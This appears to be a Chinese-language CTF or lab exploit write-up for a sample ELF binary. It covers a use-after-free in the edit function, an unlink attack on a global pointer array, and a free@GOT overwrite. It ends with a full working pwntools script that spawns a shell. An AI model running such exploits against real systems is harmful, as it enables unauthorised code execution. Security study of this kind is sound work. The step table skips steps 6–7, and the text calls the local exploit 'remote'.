# 漏洞利用文档

## 执行环境
基于exp脚本和调试信息分析，程序的运行环境如下：
- **二进制类型**：ELF 64位可执行文件
- **保护机制**：从exp成功利用unlink攻击和GOT覆盖来看，程序可能未开启PIE（地址固定）、Stack Canary或Full RELRO，但可能启用了NX（数据不可执行）
- **依赖库**：依赖标准C库（libc），exp中通过`elf.libc`获取
- **运行要求**：需要在Linux环境下运行，依赖堆管理器的ptmalloc2实现
- **关键地址**：
  - 全局指针数组`s`地址：0x6020D8
  - free@GOT地址：0x602018
  - 目标函数地址：0x4009C0

## 漏洞成因
### 关键结构体
程序使用全局指针数组`s`（地址0x6020D8）管理堆内存，该数组包含10个字符指针，用于存储分配的堆块地址。

### 漏洞分析
**漏洞类型**：Use-After-Free (UAF)

**漏洞位置**：`sub_400B2F`函数（选项3对应的编辑功能）

**根本原因**：
1. **释放后未置空**：在`sub_400AB7`（选项2）中，程序调用`free((&s)[v1])`释放堆内存，但未将对应的指针置为NULL
2. **UAF读写**：在`sub_400B2F`（选项3）中，程序直接使用已释放的指针：
   - `v2 = strlen((&s)[v1])` - 对已释放内存调用strlen
   - `sub_4008B6((&s)[v1], v2 + 1)` - 向已释放内存写入数据

**攻击向量**：
- 分配内存（选项1）→ 释放内存（选项2）→ 编辑已释放内存（选项3）
- 这导致攻击者可以读写已释放的堆块，进而实现信息泄露、堆布局控制和任意地址写

## 漏洞利用过程
基于exp的9个步骤和调试记录，以下是关键内存状态变化：

| 步骤 | 操作 | 堆状态变化 | 全局数组`s`状态 | Bins状态 | 关键发现 |
|------|------|------------|-----------------|----------|----------|
| 1 | 初始等待 | 堆未初始化 | 所有指针为NULL | 所有bins为空 | 程序处于初始状态 |
| 2 | 分配5个0x100堆块 | 成功分配5个堆块：0x3d1c3000-0x3d1c3440 | 指针存储异常：s[0]=0x3d1c3340, s[1]=0x3d1c3450 | bins为空 | 堆内存分配成功但指针管理异常 |
| 3 | 释放索引3、4堆块 | 堆块0x3d1c3330和0x3d1c3440被释放 | s数组状态不变 | 释放的堆块进入相应bins | UAF条件初步建立 |
| 4 | 分配0x210伪造chunk | 在0x3d1c3330构造伪造chunk：size=0x221, fd_nextsize=0x6020c0, bk_nextsize=0x6020c8 | s数组状态不变 | bins再次为空 | unlink攻击payload就位 |
| 5 | 释放索引4堆块 | 触发unlink操作 | s[0]被修改为0x6020c0（指向自身附近） | bins状态变化 | unlink攻击成功，获得任意地址写能力 |

| 8 | 释放索引2堆块 | 触发被劫持的free函数 | 程序跳转到/bin/dash | 堆布局变为dash的堆 | 代码执行成功，获取shell |
| 9 | 交互模式 | 在/bin/dash shell中运行 | 程序完全被控制 | 新的堆映射建立 | exploit完全成功 |

### 利用链总结
1. **UAF触发**：通过分配-释放-编辑操作触发UAF漏洞
2. **堆布局控制**：精心安排堆块分配和释放顺序，控制堆布局
3. **unlink攻击**：构造伪造chunk，利用unlink操作修改全局指针
4. **GOT劫持**：通过任意地址写能力覆盖free@GOT为目标地址
5. **代码执行**：触发free函数调用，跳转到shell

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample9')
p = process('./data/sample9')
libc = elf.libc
func_addr = 0x4009C0  # 目标函数地址（实际为system或shell函数）
free_got_plt = 0x602018  # free@GOT地址
p_addr = 0x6020D8  # 全局指针数组s的地址

def create(size, content):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.send(content)

def modify(idx, content1, content2):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.send(content1)
    p.send(content2)

def delete(idx):
    p.sendline(b'2')
    p.sendline(str(idx).encode())

# Step 1: 等待程序初始化完成
p.recvuntil('silent2')

# Step 2: 分配5个堆块，建立堆布局
# 注意：第三个堆块包含"/bin/sh"字符串，为后续执行shell准备
create(0x100, b'AAAA')
create(0x100, b'BBBB') 
create(0x100, b'/bin/sh\x00')  # 关键：存储/bin/sh字符串
create(0x100, b'DDDD')
create(0x100, b'EEEEE')

# Step 3: 释放索引3和4的堆块，创建UAF条件
delete(3)
delete(4)

# Step 4: 重新分配大块，构造伪造chunk用于unlink攻击
# payload结构：prev_size + size + fd + bk + fd_nextsize + bk_nextsize + padding
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + b'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100)
create(0x210, payload)  # 触发堆块合并和伪造chunk构造

# Step 5: 再次释放触发unlink操作
# unlink操作将修改s[0]指向全局数组自身附近，获得任意地址写能力
delete(4)

# Step 6: 尝试修改索引3（可能因指针异常失败）
# 意图：将free@GOT地址写入可控位置
modify(3, p64(free_got_plt)[0:4], b'1111')

# Step 7: 修改索引0，通过unlink建立的指针链覆盖GOT
# 利用s[0]→0x6020c0→0x602018链覆盖free@GOT
modify(0, p64(func_addr)[0:6], b'2222')

# Step 8: 触发被劫持的free函数，执行shell
# 此时free@GOT已被覆盖为0x4009c0，调用free实际执行目标函数
delete(2)

# Step 9: 进入交互模式，使用获得的shell
p.interactive()
```

### 关键exp技术点注释
1. **堆风水**：通过精确的堆块分配和释放顺序，控制堆布局为unlink攻击创造条件
2. **伪造chunk**：构造符合unlink检查的伪造chunk结构，绕过安全机制
3. **指针链利用**：利用unlink修改的指针建立s[0]→0x6020c0→0x602018的写入链
4. **GOT覆盖**：通过任意地址写能力劫持free函数，将其重定向到目标地址
5. **参数准备**：提前在堆中布置"/bin/sh"字符串，确保system函数有正确参数

该exploit成功利用了UAF漏洞，通过unlink攻击获得任意地址写能力，最终劫持GOT执行shell，实现了完整的远程代码执行。
